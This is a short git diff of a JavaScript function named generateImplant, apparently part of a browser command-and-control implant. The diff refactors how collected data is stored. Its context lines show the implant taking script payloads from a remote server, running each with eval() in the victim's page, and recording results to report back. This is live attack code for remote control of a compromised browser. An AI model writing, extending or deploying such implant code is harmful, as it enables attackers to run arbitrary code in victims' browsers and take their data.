@@ -20,8 +20,8 @@ async function generateImplant(server, callbackInterval) {
     let data = {}
     let id = "";
 
-    function setData(name, value) {
-        data[name] = value;
+    function setData(name, value, type) {
+        data[name] = {"value": value, "type": type};
     }
 
     async function createHID() {
@@ -84,8 +84,8 @@ async function generateImplant(server, callbackInterval) {
                     }),
                 }).then(response => response.json().then(responseData => {
                     commands = [];
-                    data = {}
                     responseData.forEach((payload) => {
+                        data = {}
                         const script = payload.script
                         try {
                             if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
@@ -95,7 +95,6 @@ async function generateImplant(server, callbackInterval) {
                             } else {
                                 eval(script);
                             }
-
                             commands.push({
                                 id: payload.id,
                                 name: payload.name,
